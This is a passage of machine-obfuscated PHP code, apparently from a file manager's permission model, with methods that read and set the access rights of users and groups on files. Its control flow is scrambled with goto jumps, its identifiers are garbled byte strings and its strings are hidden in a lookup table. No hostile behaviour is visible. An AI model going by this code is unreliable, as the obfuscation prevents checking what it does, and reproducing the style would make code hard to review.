bà‹ÎŸ†¼: $F¤ñí´ºõ = array($eÏÌĞÃ ™[387] => array($eÏÌĞÃ ™[7], $a•í¸“ßÁ®), $eÏÌĞÃ ™[462] => 1); $e†óÕ’ £’ = Model($eÏÌĞÃ ™[1640])->where($F¤ñí´ºõ)->field($eÏÌĞÃ ™[457])->select(); if (empty($e†óÕ’ £’)) { return; } goto EÌæĞòíö¥; EÌæĞòíö¥: $C„ñÙğŒ = array_to_keyvalue($e†óÕ’ £’, $eÏÌĞÃ ™[33], $eÏÌĞÃ ™[457]); $this->remove($C„ñÙğŒ); goto bŠÊ…¯¥ó; E¨™Ší·: $eÏÌĞÃ ™ =& $_SERVER[òÀöí]; $e†óÕ’ £’ = Model($eÏÌĞÃ ™[778])->where(array($eÏÌĞÃ ™[436] => $eÖ×Ö³ˆà))->field($eÏÌĞÃ ™[387])->select(); $a•í¸“ßÁ® = array_to_keyvalue($e†óÕ’ £’, $eÏÌĞÃ ™[33], $eÏÌĞÃ ™[387]); goto bà‹ÎŸ†¼; bŠÊ…¯¥ó: } private function shareFileMeta($AÕ£ñ¸é·Ù, $f¸æ¾ì‘Ó½ = null) { $fÜµøø’¡ß =& $_SERVER[òÀöí]; $fîÕŒ”Ë’Ä = array($fÜµøø’¡ß[436] => $AÕ£ñ¸é·Ù, $fÜµøø’¡ß[92] => $fÜµøø’¡ß[1829]); if (is_null($f¸æ¾ì‘Ó½)) { return Model($fÜµøø’¡ß[1830])->where($fîÕŒ”Ë’Ä)->find(); } $fîÕŒ”Ë’Ä[$fÜµøø’¡ß[368]] = $f¸æ¾ì‘Ó½; Model($fÜµøø’¡ß[1830])->add($fîÕŒ”Ë’Ä, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\x63\x65\137\141\165\x74\x68"; public function getAuth($cÒ¿ùœ‡Üâ) { goto Aœğğ§À©; Aœğğ§À©: $bÃ¨£åÉÉ— =& $_SERVER[òÀöí]; $BÅŠñÄŒ‹Ç = $this->sourceAuthSelect($cÒ¿ùœ‡Üâ); $FÍğŒŒ÷ß” = array(); goto E‰Ç¿­¸›; E‰Ç¿­¸›: $bÂé¹îŠğó = array(); $eíÍ¨¢™Í = 2 << 25; foreach ($BÅŠñÄŒ‹Ç as $Fá›È­«–ò) { goto bµŒ³ìåä; F„‡‘Š˜ˆ¦: $AÚøë©ã¿ = 0; if ($Fá›È­«–ò[$bÃ¨£åÉÉ—[389]] == SourceModel::TYPE_GROUP) { $AÚøë©ã¿ = $eíÍ¨¢™Í * 2; } if ($Fá›È­«–ò[$bÃ¨£åÉÉ—[389]] == SourceModel::TYPE_USER) { $AÚøë©ã¿ = $eíÍ¨¢™Í; } goto f×Å‰½Ìƒ; f×Å‰½Ìƒ: if ($Fá›È­«–ò[$bÃ¨£åÉÉ—[389]] == SourceModel::TYPE_USER && $Fá›È­«–ò[$bÃ¨£åÉÉ—[474]] == $bÃ¨£åÉÉ—[486]) { $AÚøë©ã¿ = 0; } $bÂé¹îŠğó[] = $fíé¸ˆìë[$bÃ¨£åÉÉ—[394]] + $AÚøë©ã¿; goto F®ãùÃò Ó; bµŒ³ìåä: $fíé¸ˆìë = Model($bÃ¨£åÉÉ—[1831])->listData($Fá›È­«–ò[$bÃ¨£åÉÉ—[1812]]); if (!$fíé¸ˆìë) { continue; } $FÍğŒŒ÷ß”[] = $Fá›È­«–ò; goto F„‡‘Š˜ˆ¦; F®ãùÃò Ó: } goto aê°»™ì„; aê°»™ì„: array_multisort($bÂé¹îŠğó, SORT_DESC, $FÍğŒŒ÷ß”); return $FÍğŒŒ÷ß”; goto fø¨Ÿ—í‰ä; fø¨Ÿ—í‰ä: } public function sourceAuthSelect($aãÃ„Ç»ÙÔ) { goto e˜Üµƒ‡; e˜Üµƒ‡: $Dé•šùƒÕÏ =& $_SERVER[òÀöí]; static $F¦Ù¯ÎŠŸà = array(); $bõöôâ‚ƒ = is_array($aãÃ„Ç»ÙÔ) ? !1 : !0; goto eÀÖõØ¯Îã; EøµİÉ†±¬: $bÖ”¼Ò¼„¹ = $this->field($C†½Šº¤Ÿ˜)->order($Dé•šùƒÕÏ[385])->where($e›–È‘¬õ±)->select(); $cçÆÕ”âçÔ = array_to_keyvalue_group($bÖ”¼Ò¼„¹, $Dé•šùƒÕÏ[387]); foreach ($aãÃ„Ç»ÙÔ as $BãºŸß›¿) { $F¦Ù¯ÎŠŸà[$BãºŸß›¿] = $cçÆÕ”âçÔ[$BãºŸß›¿] ? $cçÆÕ”âçÔ[$BãºŸß›¿] : array(); } goto b¬ğÉÃ‡¥‚; eÀÖõØ¯Îã: if ($bõöôâ‚ƒ) { $aãÃ„Ç»ÙÔ = array($aãÃ„Ç»ÙÔ); } $eßÆ°°Š = array(); foreach ($aãÃ„Ç»ÙÔ as $BãºŸß›¿) { if (isset($F¦Ù¯ÎŠŸà[$BãºŸß›¿])) { $eßÆ°°Š[$BãºŸß›¿] = $F¦Ù¯ÎŠŸà[$BãºŸß›¿]; } } goto fíÖ„ÛŞé¹; b¬ğÉÃ‡¥‚: if ($bõöôâ‚ƒ) { return $bÖ”¼Ò¼„¹; } return $cçÆÕ”âçÔ; goto dÓ›ôªà¶; fíÖ„ÛŞé¹: if (count($eßÆ°°Š) == count($aãÃ„Ç»ÙÔ)) { return $bõöôâ‚ƒ ? $eßÆ°°Š[$aãÃ„Ç»ÙÔ[0]] : $eßÆ°°Š; } $C†½Šº¤Ÿ˜ = $Dé•šùƒÕÏ[1832]; $e›–È‘¬õ± = array($Dé•šùƒÕÏ[387] => array($Dé•šùƒÕÏ[7], $aãÃ„Ç»ÙÔ)); goto EøµİÉ†±¬; dÓ›ôªà¶: } public function setAuth($EåäØš…èÌ, $eÒÉœœÛŸË) { goto A° ¨ø­; c¡¹ŸÁ÷: foreach ($eÒÉœœÛŸË as $C«Ãª´é‘ñ) { if (!in_array($C«Ãª´é‘ñ[$Fèó¡‡µš¶[389]], $Fø’ñ´£)) { show_json(LNG($Fèó¡‡µš¶[1833]), !1); } if ($BÃ¯ö¹²¶ != $a¦¦×ÕŞ»Â) { if ($C«Ãª´é‘ñ[$Fèó¡‡µš¶[389]] == SourceModel::TYPE_GROUP) { } if ($C«Ãª´é‘ñ[$Fèó¡‡µš¶[474]] != 0 && !in_array($C«Ãª´é‘ñ[$Fèó¡‡µš¶[474]], $BßÀğ™¶¢”)) { } } if ($C«Ãª´é‘ñ[$Fèó¡‡µš¶[474]] == 0) { $C«Ãª´é‘ñ[$Fèó¡‡µš¶[389]] = SourceModel::TYPE_USER; } $FÓâ£‘Ÿá[] = array($Fèó¡‡µš¶[387] => $EåäØš…èÌ, $Fèó¡‡µš¶[389] => intval($C«Ãª´é‘ñ[$Fèó¡‡µš¶[389]]), $Fèó¡‡µš¶[474] => intval($C«Ãª´é‘ñ[$Fèó¡‡µš¶[474]]), $Fèó¡‡µš¶[1812] => intval($C«Ãª´é‘ñ[$Fèó¡‡µš¶[1812]]) ? intval($C«Ãª´é‘ñ[$Fèó¡‡µš¶[1812]]) : 0, $Fèó¡‡µš¶[1813] => intval($C«Ãª´é‘ñ[$Fèó¡‡µš¶[1813]]) ? intval($C«Ãª´é‘ñ[$Fèó¡‡µš¶[1813]]) : -1); } $this->where(array($Fèó¡‡µš¶[401] => $EåäØš…èÌ))->delete(); $this->addAll($FÓâ£‘Ÿá); goto bÂ¤šË×âÓ; C°´‘‘è„«: if ($c¶ßÀ½„¢[$Fèó¡‡µš¶[389]] != SourceModel::TYPE_GROUP) { return !1; } $a¦¦×ÕŞ»Â = 1; $BÃ¯ö¹²¶ = $c¶ßÀ½„¢[$Fèó¡‡µš¶[474]]; goto B‰œ¤šÜæã; bÂ¤šË×âÓ: return !0; goto Dğˆ‘¹½°; B‰œ¤šÜæã: if ($BÃ¯ö¹²¶ != $a¦¦×ÕŞ»Â) { $fùáœ®á©‘ = array($Fèó¡‡µš¶[1663] => $BÃ¯ö¹²¶); $BßÀğ™¶¢” = Model($Fèó¡‡µš¶[1746])->field($Fèó¡‡µš¶[1504])->where($fùáœ®á©‘)->select(); $BßÀğ™¶¢” = array_to_keyvalue($BßÀğ™¶¢”, $Fèó¡‡µš¶[33], $Fèó¡‡µš¶[1504]); } $Fø’ñ´£ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $FÓâ£‘Ÿá = array(); goto c¡¹ŸÁ÷; A° ¨ø­: $Fèó¡‡µš¶ =& $_SERVER[òÀöí]; $c¶ßÀ½„¢ = Model($Fèó¡‡µš¶[1181])->sourceInfo($EåäØš…èÌ); if (!$c¶ßÀ½„¢) { return !1; } goto C°´‘‘è„«; Dğˆ‘¹½°: } public function authClear($dº˜òîšËœ) { $EîÛô‰Ğ¾ª =& $_SERVER[òÀöí]; $dÆâÃŠ÷æë = Model($EîÛô‰Ğ¾ª[1181])->sourceInfo($dº˜òîšËœ); $fë¤öå÷íí = array($dº˜òîšËœ); if ($dÆâÃŠ÷æë[$EîÛô‰Ğ¾ª[388]] == $EîÛô‰Ğ¾ª[86]) { $dÉÇŒ÷¹Šï = array($EîÛô‰Ğ¾ª[542] => array($EîÛô‰Ğ¾ª[501], $dÆâÃŠ÷æë[$EîÛô‰Ğ¾ª[477]] . $dº˜òîšËœ . $EîÛô‰Ğ¾ª[502])); $fë¤öå÷íí = Model($EîÛô‰Ğ¾ª[1181])->field($EîÛô‰Ğ¾ª[401])->where($dÉÇŒ÷¹Šï)->getField($EîÛô‰Ğ¾ª[387], !0); $fë¤öå÷íí[] = $dº˜òîšËœ; } $this->where(array($EîÛô‰Ğ¾ª[401] => array($EîÛô‰Ğ¾ª[402], $fë¤öå÷íí)))->delete(); return !0; } public function getAllChildren($eª¤Ÿ‡ôÀĞ) { goto c’†Œ˜ª­î; eÒ’ÖŞ”Ñ°: $BáÈ´İÓ· = Model($eôŠ²ÓÎ‹ï[778])->field($d´½’––˜)->where($eÛÁã¬ô·Ñ)->select(); $c¢«š‚è¬Î = array($eª¤Ÿ‡ôÀĞ); foreach ($BáÈ´İÓ· as $bø–Ûíê®Å) { foreach ($C¦†áŠÑØí as $F¹ÀŠ™¨ùÈ) { $aµÊ‡®³•Ğ = $eôŠ²ÓÎ‹ï[47] . $F¹ÀŠ™¨ùÈ . $eôŠ²ÓÎ‹ï[47]; $fåº’ì©ÚÊ = $bø–Ûíê®Å[$eôŠ²ÓÎ‹ï[477]] . $bø–Ûíê®Å[$eôŠ²ÓÎ‹ï[387]] . $eôŠ²ÓÎ‹ï[47]; if (strstr($fåº’ì©ÚÊ, $aµÊ‡®³•Ğ)) { $c¢«š‚è¬Î[] = $bø–Ûíê®Å[$eôŠ²ÓÎ‹ï[387]]; break; } } } goto b­£İ—³œ§; C›µ—Â­Õ’: if ($D¯Ú¼¼Ú„¥[$eôŠ²ÓÎ‹ï[389]] != SourceModel::TYPE_GROUP) { return array(); } $aƒäŒª‚‘Ô = 1; $C¦†áŠÑØí = array($eª¤Ÿ‡ôÀĞ); goto C‡ªßÒâ²“; b­£İ—³œ§: return $this->sourceListAuth($c¢«š‚è¬Î); goto F£†‹‹›‰Œ; C‡ªßÒâ²“: if ($D¯Ú¼¼Ú„¥[$eôŠ²ÓÎ‹ï[479]] == $eôŠ²ÓÎ‹ï[486] && $D¯Ú¼¼Ú„¥[$eôŠ²ÓÎ‹ï[474]] != $aƒäŒª‚‘Ô) { $C¦†áŠÑØí = $this->groupChidldAllRootSource($D¯Ú¼¼Ú„¥[$eôŠ²ÓÎ‹ï[474]]); } $Fæ£ö¢¶å = $this->field($eôŠ²ÓÎ‹ï[387])->group($eôŠ²ÓÎ‹ï[387])->select(); $Fæ£ö¢¶å = array_to_keyvalue($Fæ£ö¢¶å, $eôŠ²ÓÎ‹ï[33], $eôŠ²ÓÎ‹ï[387]); goto b¼˜¥‚•–Š; b¼˜¥‚•–Š: if (!$Fæ£ö¢¶å) { return array(); } $d´½’––˜ = $eôŠ²ÓÎ‹ï[1834]; $eÛÁã¬ô·Ñ = array($eôŠ²ÓÎ‹ï[387] => array($eôŠ²ÓÎ‹ï[7], $Fæ£ö¢¶å), $eôŠ²ÓÎ‹ï[414] => $eôŠ²ÓÎ‹ï[486]); goto eÒ’ÖŞ”Ñ°; c’†Œ˜ª­î: $eôŠ²ÓÎ‹ï =& $_SERVER[òÀöí]; $D¯Ú¼¼Ú„¥ = Model($eôŠ²ÓÎ‹ï[1181])->sourceInfo($eª¤Ÿ‡ôÀĞ); if ($D¯Ú¼¼Ú„¥[$eôŠ²ÓÎ‹ï[388]] != $eôŠ²ÓÎ‹ï[86]) { return $this->sourceListAuth(array($eª¤Ÿ‡ôÀĞ)); } goto C›µ—Â­Õ’; F£†‹‹›‰Œ: } private function sourceListAuth($BÒ—ºçŞßœ) { goto BÉÃÎšã…Ò; bè„æˆ¹Œî: array_multisort($c¨Œ™áçó, SORT_ASC, $aàïòö·İ±); return $aàïòö·İ±; goto dÆÑï…îä; BÉÃÎšã…Ò: $Bø²ÄŠÅ­ø =& $_SERVER[òÀöí]; $aƒ°¢Ø–Óù = Model($Bø²ÄŠÅ­ø[1181])->sourceListInfo($BÒ—ºçŞßœ, !0); $B²İ†¤¤ˆİ = $this->sourceAuthSelect($BÒ—ºçŞßœ); goto F‚«‹íç¯¬; F‚«‹íç¯¬: $aàïòö·İ± = array(); $c¨Œ™áçó = array(); foreach ($aƒ°¢Ø–Óù as $B‡¤İ’êğô) { goto a´ø®É¨Ç„; A¹ËèÚö²: unset($B‡¤İ’êğô[$Bø²ÄŠÅ­ø[84]]); $F–§¬ê¹£ = $B²İ†¤¤ˆİ[$B‡¤İ’êğô[$Bø²ÄŠÅ­ø[387]]]; if (!$F–§¬ê¹£) { continue; } goto bçßĞ»Ò¨ñ; A‡áãÛ²ï: $cé¾Ñ²Ï…Ç = count(explode($Bø²ÄŠÅ­ø[8], trim($B‡¤İ’êğô[$Bø²ÄŠÅ­ø[484]], $Bø²ÄŠÅ­ø[8]))); $c¨Œ™áçó[] = $cé¾Ñ²Ï…Ç + ($B‡¤İ’êğô[$Bø²ÄŠÅ­ø[29]] == $Bø²ÄŠÅ­ø[76] ? 0 : 1000); goto bÃÄÖÖµæê; a´ø®É¨Ç„: unset($B‡¤İ’êğô[$Bø²ÄŠÅ­ø[397]]); unset($B‡¤İ’êğô[$Bø²ÄŠÅ­ø[396]]); unset($B‡¤İ’êğô[$Bø²ÄŠÅ­ø[394]]); goto A¹ËèÚö²; bçßĞ»Ò¨ñ: $B‡¤İ’êğô[$Bø²ÄŠÅ­ø[1835]] = $this->authTargetInfo($F–§¬ê¹£); $B‡¤İ’êğô[$Bø²ÄŠÅ­ø[484]] = rtrim($B‡¤İ’êğô[$Bø²ÄŠÅ­ø[480]], $Bø²ÄŠÅ­ø[8]) . $Bø²ÄŠÅ­ø[8] . ltrim($B‡¤İ’êğô[$Bø²ÄŠÅ­ø[484]], $Bø²ÄŠÅ­ø[8]); $aàïòö·İ±[] = $B‡¤İ’êğô; goto A‡áãÛ²ï; bÃÄÖÖµæê: } goto bè„æˆ¹Œî; dÆÑï…îä: } private function groupChidldAllRootSource($DĞ§ñƒİ…Æ) { $cÖö¥ŠäË =& $_SERVER[òÀöí]; $b‘­‚¬òÅ³ = Model($cÖö¥ŠäË[1836])->groupChildrenAll($DĞ§ñƒİ…Æ); $aÚùëöÓ = array($cÖö¥ŠäË[479] => 0, $cÖö¥ŠäË[474] => array($cÖö¥ŠäË[7], $b‘­‚¬òÅ³), $cÖö¥ŠäË[389] => SourceModel::TYPE_GROUP); $bãù¿É”çê = Model($cÖö¥ŠäË[778])->field($cÖö¥ŠäË[387])->where($aÚùëöÓ)->select(); $bãù¿É”çê = array_to_keyvalue($bãù¿É”çê, $cÖö¥ŠäË[33], $cÖö¥ŠäË[387]); return $bãù¿É”çê; } private function authTargetInfo($Bİµ×¿íÆò) { goto FŞ½×‡Á; Fè—Û„£çá: $eÊ°ù­÷Ü = 2 << 25; foreach ($Bİµ×¿íÆò as $A¯ÁÒœÁê®) { goto Eƒ¡™ØŒ¬; fÇŞˆ‰Äµ‹: if (!$FÄ–«•¿æ®) { continue; } $FÄ–«•¿æ®[$D¾Í—šÒ·[435]] = $d„îÇ„ÉÓ¿; $AŠšĞ‰ …÷[] = $FÄ–«•¿æ®; goto eêŸ¯™òñË; eêŸ¯™òñË: $aèˆº¥Í‚ = 0; if ($A¯ÁÒœÁê®[$D¾Í—šÒ·[389]] == SourceModel::TYPE_GROUP) { $aèˆº¥Í‚ = $eÊ°ù­÷Ü * 2; } if ($A¯ÁÒœÁê®[$D¾Í—šÒ·[389]] == SourceModel::TYPE_USER) { $aèˆº¥Í‚ = $eÊ°ù­÷Ü; } goto a™Ê§Ş›Î; a™Ê§Ş›Î: if ($A¯ÁÒœÁê®[$D¾Í—šÒ·[389]] == SourceModel::TYPE_USER && $A¯ÁÒœÁê®[$D¾Í—šÒ·[474]] == $D¾Í—šÒ·[486]) { $aèˆº¥Í‚ = 0; } $f¹ğ¤ìÜŠ[] = $d„îÇ„ÉÓ¿[$D¾Í—šÒ·[394]] + $aèˆº¥Í‚; goto d‚áØ²à³¼; Eƒ¡™ØŒ¬: $d„îÇ„ÉÓ¿ = Model($D¾Í—šÒ·[1831])->listData($A¯ÁÒœÁê®[$D¾Í—šÒ·[1812]]); if (!$d„îÇ„ÉÓ¿) { continue; } if ($A¯ÁÒœÁê®[$D¾Í—šÒ·[389]] == SourceModel::TYPE_USER) { $FÄ–«•¿æ® = Model($D¾Í—šÒ·[492])->getInfoSimpleOuter($A¯ÁÒœÁê®[$D¾Í—šÒ·[474]]); if ($FÄ–«•¿æ®[$D¾Í—šÒ·[1504]] == $D¾Í—šÒ·[1063]) { continue; } if ($FÄ–«•¿æ®[$D¾Í—šÒ·[1504]] == $D¾Í—šÒ·[486]) { $FÄ–«•¿æ®[$D¾Í—šÒ·[28]] = LNG($D¾Í—šÒ·[1837]); } } else { $FÄ–«•¿æ® = Model($D¾Í—šÒ·[476])->getInfoSimple($A¯ÁÒœÁê®[$D¾Í—šÒ·[474]]); } goto fÇŞˆ‰Äµ‹; d‚áØ²à³¼: } array_multisort($f¹ğ¤ìÜŠ, SORT_DESC, $AŠšĞ‰ …÷); goto FÅÉŸ¸‡¯’; FŞ½×‡Á: $D¾Í—šÒ· =& $_SERVER[òÀöí]; $AŠšĞ‰ …÷ = array(); $f¹ğ¤ìÜŠ = array(); goto Fè—Û„£çá; FÅÉŸ¸‡¯’: return $AŠšĞ‰ …÷; goto dßîÜ§áã¥; dßîÜ§áã¥: } public function getAllChildrenByUser($FŞ‘ø‰ì½ê, $dƒ½òçÍ‚Ş) { goto eî©Ì÷å¨°; d…òÄ²Á¼‡: if ($dÇÉ¹¯‡¦ø[$eÀİ²šÃ[479]] == $eÀİ²šÃ[486] && $dÇÉ¹¯‡¦ø[$eÀİ²šÃ[474]] != $C„¹Ÿƒ¸äá && $this->groupContainUser($dÇÉ¹¯‡¦ø[$eÀİ²šÃ[474]], $dƒ½òçÍ‚Ş)) { foreach ($bÂÑ­Õğöõ[$eÀİ²šÃ[1838]] as $aéÇƒˆóˆƒ) { $d‰‰š˜¦Å = Model($eÀİ²šÃ[476])->getInfo($aéÇƒˆóˆƒ[$eÀİ²šÃ[1663]]); $e¸¨Æ¼‹É = Model($eÀİ²šÃ[495])->getInfoSimpleOuter($dƒ½òçÍ‚Ş); $e¸¨Æ¼‹É[$eÀİ²šÃ[435]] = $aéÇƒˆóˆƒ[$eÀİ²šÃ[394]]; if (Model($eÀİ²šÃ[1831])->authCheckAction($aéÇƒˆóˆƒ[$eÀİ²šÃ[394]][$eÀİ²šÃ[394]], $eÀİ²šÃ[1683])) { continue; } $Dé†À÷‰Ş® = array($eÀİ²šÃ[28] => $eÀİ²šÃ[1456] . $d‰‰š˜¦Å[$eÀİ²šÃ[28]], $eÀİ²šÃ[387] => $d‰‰š˜¦Å[$eÀİ²šÃ[84]][$eÀİ²šÃ[387]], $eÀİ²šÃ[75] => KodIO::make($d‰‰š˜¦Å[$eÀİ²šÃ[84]][$eÀİ²šÃ[387]]), $eÀİ²šÃ[479] => $eÀİ²šÃ[486], $eÀİ²šÃ[389] => $eÀİ²šÃ[994], $eÀİ²šÃ[29] => $eÀİ²šÃ[506], $eÀİ²šÃ[484] => $d‰‰š˜¦Å[$eÀİ²šÃ[481]], $eÀİ²šÃ[1663] => $d‰‰š˜¦Å[$eÀİ²šÃ[1663]], $eÀİ²šÃ[478] => $d‰‰š˜¦Å[$eÀİ²šÃ[479]], $eÀİ²šÃ[1835] => array($e¸¨Æ¼‹É)); $bØ–æ¤ôµã[$Dé†À÷‰Ş®[$eÀİ²šÃ[387]]] = $Dé†À÷‰Ş®; } } $Fïó©÷„‰ = array(); $Då…£¼ºÊÜ = $this->getAllChildren($FŞ‘ø‰ì½ê); goto BâŸ×îšÀÌ; fÖ¨Ê©„ÑŒ: $dÇÉ¹¯‡¦ø = Model($eÀİ²šÃ[1181])->sourceInfo($FŞ‘ø‰ì½ê); $bØ–æ¤ôµã = array(); $C„¹Ÿƒ¸äá = 1; goto d…òÄ²Á¼‡; BâŸ×îšÀÌ: foreach ($Då…£¼ºÊÜ as $e²ù¿Ğß) { $DÎÏäğ¦Î = !1; foreach ($e²ù¿Ğß[$eÀİ²šÃ[1835]] as $dÂ„¦—„ìÁ) { if ($dÂ„¦—„ìÁ[$eÀİ²šÃ[1504]]) { if ($dÂ„¦—„ìÁ[$eÀİ²šÃ[1504]] == $dƒ½òçÍ‚Ş) { $DÎÏäğ¦Î = !0; break; } } if ($dÂ„¦—„ìÁ[$eÀİ²šÃ[1663]]) { if ($this->groupContainUser($dÂ„¦—„ìÁ[$eÀİ²šÃ[1663]], $dƒ½òçÍ‚Ş)) { $DÎÏäğ¦Î = !0; break; } } } if ($DÎÏäğ¦Î) { $Fïó©÷„‰[] = $e²ù¿Ğß; } $fö…‚•ö¹á = $e²ù¿Ğß[$eÀİ²šÃ[387]]; if (isset($bØ–æ¤ôµã[$fö…‚•ö¹á])) { $e²ù¿Ğß[$eÀİ²šÃ[1835]][] = $bØ–æ¤ôµã[$fö…‚•ö¹á][0]; $bØ–æ¤ôµã[$fö…‚•ö¹á] = !1; } } $bØ–æ¤ôµã = array_filter(array_values($bØ–æ¤ôµã)); $Fïó©÷„‰ = array_merge($bØ–æ¤ôµã, $Fïó©÷„‰); goto D¿å¾«‰²í; eî©Ì÷å¨°: $eÀİ²šÃ =& $_SERVER[òÀöí]; $bÂÑ­Õğöõ = Model($eÀİ²šÃ[495])->getInfo($dƒ½òçÍ‚Ş); if (!$dƒ½òçÍ‚Ş || !$FŞ‘ø‰ì½ê || !$bÂÑ­Õğöõ) { return array(); } goto fÖ¨Ê©„ÑŒ; D¿å¾«‰²í: return $Fïó©÷„‰; goto bäÎğğ‘É; bäÎğğ‘É: } public function setAllChildrenByUser($CõÑŠ‰À­, $cÛŞ‡œ³à‡, $B£Í¡—ƒ™º) { $EÍåàÈŠŒ  =& $_SERVER[òÀöí]; $eÇ„Ş„èˆ = $this->getAllChildrenByUser($CõÑŠ‰À­, $cÛŞ‡œ³à‡); if (!$B£Í¡—ƒ™º || !$eÇ„Ş„èˆ) { return !1; } foreach ($eÇ„Ş„èˆ as $eÓ‰óåé×±) { $B­İŒá´ÍÒ = array(); foreach ($eÓ‰óåé×±[$EÍåàÈŠŒ [1835]] as $b‚¾Šã²ë) { $eè›å¨Ê¡Ä = $b‚¾Šã²ë[$EÍåàÈŠŒ [435]]; $bù»¸ñ¼ï‚ = $b‚¾Šã²ë[$EÍåàÈŠŒ [1504]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $e¨†­ÒÆä¬ = $b‚¾Šã²ë[$EÍåàÈŠŒ [1504]] ? $b‚¾Šã²ë[$EÍåàÈŠŒ [1504]] : $b‚¾Šã²ë[$EÍåàÈŠŒ [1663]]; if ($b‚¾Šã²ë[$EÍåàÈŠŒ [1504]] && $b‚¾Šã²ë[$EÍåàÈŠŒ [1504]] == $cÛŞ‡œ³à‡) { continue; } $B­İŒá´ÍÒ[] = array($EÍåàÈŠŒ [387] => $eÓ‰óåé×±[$EÍåàÈŠŒ [387]], $EÍåàÈŠŒ [389] => $bù»¸ñ¼ï‚, $EÍåàÈŠŒ [474] => intval($e¨†­ÒÆä¬), $EÍåàÈŠŒ [1812] => isset($eè›å¨Ê¡Ä[$EÍåàÈŠŒ [385]]) ? intval($eè›å¨Ê¡Ä[$EÍåàÈŠŒ [385]]) : 0, $EÍåàÈŠŒ [1813] => isset($eè›å¨Ê¡Ä[$EÍåàÈŠŒ [1813]]) ? intval($eè›å¨Ê¡Ä[$EÍåàÈŠŒ [1813]]) : -1); } $B­İŒá´ÍÒ[] = array($EÍåàÈŠŒ [387] => $eÓ‰óåé×±[$EÍåàÈŠŒ [387]], $EÍåàÈŠŒ [389] => SourceModel::TYPE_USER, $EÍåàÈŠŒ [474] => intval($cÛŞ‡œ³à‡), $EÍåàÈŠŒ [1812] => intval($B£Í¡—ƒ™º), $EÍåàÈŠŒ [1813] => -1); $this->where(array($EÍåàÈŠŒ [401] => $eÓ‰óåé×±[$EÍåàÈŠŒ [387]]))->delete(); $this->addAll($B­İŒá´ÍÒ); } return !0; } public function get($EËáÄñ¯ÔŒ) { $D÷Â‡ÁÈ—Á = $this->getSourceList(array($EËáÄñ¯ÔŒ), !0); return $D÷Â‡ÁÈ—Á[0]; } public function getSourceList($aõÖ‹æŸˆ‹, $B·ƒ…–ÀÕ = false, $c’´‰¶¤÷É = false) { goto Dˆ›…‚‡Ë; c’”¬›“¥ : if (!$B·ƒ…–ÀÕ && count($aõÖ‹æŸˆ‹) == 1) { $B·ƒ…–ÀÕ = array(); $B·ƒ…–ÀÕ[$aõÖ‹æŸˆ‹[0]] = $F˜©µ†œ·±->sourceInfo($aõÖ‹æŸˆ‹[0]); } if (!$B·ƒ…–ÀÕ) { $E¤…È•Ó£¹ = array($dÕ½™ºğ[401] => array($dÕ½™ºğ[402], $aõÖ‹æŸˆ‹)); $B·ƒ…–ÀÕ = $F˜©µ†œ·±->field($dÕ½™ºğ[1839])->where($E¤…È•Ó£¹)->select(); $B·ƒ…–ÀÕ = array_to_keyvalue($B·ƒ…–ÀÕ, $dÕ½™ºğ[387]); } $fç„’›ß£ = $aõÖ‹æŸˆ‹; goto e–øˆ›ö‚ë; e–øˆ›ö‚ë: foreach ($B·ƒ…–ÀÕ as $E¢ĞËòÏ => $D¿ä”ø†ŠÓ) { $fÊÈ¿±¡‹ = $F˜©µ†œ·±->parentLevelArray($D¿ä”ø†ŠÓ[$dÕ½™ºğ[477]]); $fç„’›ß£ = array_merge($fç„’›ß£, array($E¢ĞËòÏ), array_reverse($fÊÈ¿±¡‹)); } $fç„’›ß£ = array_values(array_unique($fç„’›ß£)); if (!$fç„’›ß£) { return array(); } goto cÏÆê«½¤; Dˆ›…‚‡Ë: $dÕ½™ºğ =& $_SERVER[òÀöí]; if (!$aõÖ‹æŸˆ‹) { return array(); } $F˜©µ†œ·± = Model($dÕ½™ºğ[1181]); goto c’”¬›“¥ ; EÄ™ñÙ•ƒĞ: $a‹„ë¼Ûù‹ = array(); foreach ($B·ƒ…–ÀÕ as $e±êŠçŠ—Â => $A…ù¢›Çä‰) { if ($dÈ¯‘³—Ú) { $a‹„ë¼Ûù‹[$e±êŠçŠ—Â] = $BˆÖİ®“ ­; continue; } $a‹„ë¼Ûù‹[$e±êŠçŠ—Â] = $this->makeSourceAuth($A…ù¢›Çä‰, $CÛ…¹©ô, $c’´‰¶¤÷É); } return $a‹„ë¼Ûù‹; goto càîøô˜İ‰; cÏÆê«½¤: $Föâøˆ¨  = $this->sourceAuthSelect($fç„’›ß£); $CÛ…¹©ô = array(); foreach ($fç„’›ß£ as $e±êŠçŠ—Â) { if (isset($Föâøˆ¨ [$e±êŠçŠ—Â])) { $CÛ…¹©ô[$e±êŠçŠ—Â] = $Föâøˆ¨ [$e±êŠçŠ—Â]; } } goto dâĞíËñƒÍ; dâĞíËñƒÍ: $dÈ¯‘³—Ú = $this->userIsRoot($c’´‰¶¤÷É); $a¼ÈŒÇ–˜Í = AuthModel::authAll(); $BˆÖİ®“ ­ = array($dÕ½™ºğ[395] => $a¼ÈŒÇ–˜Í, $dÕ½™ºğ[1840] => array($dÕ½™ºğ[403] => 0, $dÕ½™ºğ[1669] => $a¼ÈŒÇ–˜Í, $dÕ½™ºğ[404] => LNG($dÕ½™ºğ[1841]), $dÕ½™ºğ[1684] => $dÕ½™ºğ[1842])); goto EÄ™ñÙ•ƒĞ; càîøô˜İ‰: } public function authDeepCheck($C‘ù¾ÃãÃÃ, $FÀ¼˜ø‹ô = false) { goto F‹ò¥ª°‘í; c£Í¶‡‰šÒ: if (!in_array($C‘ù¾ÃãÃÃ, $C”©”œãÂ‡[$eÈÄÄÉ‡ÓÔ[1843]])) { return !1; } $BÂ–ø³á÷Œ = array(); foreach ($C”©”œãÂ‡[$eÈÄÄÉ‡ÓÔ[1844]] as $e‘½ÆåÎÇ => $FÜ¤®Ì¯º‘) { if (!in_array($C‘ù¾ÃãÃÃ, $FÜ¤®Ì¯º‘)) { continue; } $BÂ–ø³á÷Œ[] = $e‘½ÆåÎÇ; } goto aµƒÜ•Å«; aµƒÜ•Å«: if (!$BÂ–ø³á÷Œ) { return !1; } $dë‘ªœôÖ = $BÂ–ø³á÷Œ ? $BÂ–ø³á÷Œ[0] : $C‘ù¾ÃãÃÃ; return array($eÈÄÄÉ‡ÓÔ[395] => -1, $eÈÄÄÉ‡ÓÔ[435] => array($eÈÄÄÉ‡ÓÔ[403] => $eÈÄÄÉ‡ÓÔ[1063], 